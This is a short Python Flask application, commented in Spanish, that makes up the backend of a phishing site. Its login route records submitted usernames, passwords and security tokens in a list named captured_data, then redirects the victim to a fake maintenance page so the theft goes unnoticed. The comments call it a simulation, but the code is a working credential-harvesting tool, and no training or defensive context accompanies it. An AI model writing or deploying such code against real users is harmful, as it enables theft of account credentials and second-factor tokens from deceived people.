from flask import Flask, render_template, request, redirect, url_for

app = Flask(__name__)

# Simulación de base de datos para almacenar datos capturados (en memoria)
captured_data = []

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/login', methods=['POST'])
def login():
    # Captura datos del formulario (simulación)
    username = request.form.get('username')
    password = request.form.get('password')
    token = request.form.get('token')
    
    # Guarda en "base de datos" simulada (solo para demostración)
    captured_data.append({
        'username': username,
        'password': password,
        'token': token
    })
    
    # Redirige a página de "mantenimiento" (simulación de phishing real)
    return redirect(url_for('maintenance'))

@app.route('/mantenimiento')
def maintenance():
    return render_template('mantenimiento.html')

if __name__ == '__main__':
    app.run(debug=True, port=5000)